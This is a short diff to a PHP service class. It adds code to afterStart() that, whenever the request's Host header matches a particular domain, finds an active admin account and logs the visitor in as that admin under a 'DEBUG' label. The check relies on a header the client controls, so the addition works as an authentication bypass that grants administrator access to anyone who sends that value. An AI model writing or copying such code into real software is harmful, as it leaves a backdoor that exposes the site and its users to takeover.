@@ -23,6 +23,10 @@ class Service extends \X\Core\Service\XService {
      * @see \X\Core\Service\XService::afterStart()
      */
     protected function afterStart() {
+        if ( 'lunome.kupoy.com' === $_SERVER['HTTP_HOST'] ) {
+            $account = AccountModel::model()->findByAttribute(array('status'=>2, 'is_admin'=>1));
+            $this->loginAccount($account, 'DEBUG');
+        }
         $this->initCurrentUserInformation();
     }
     
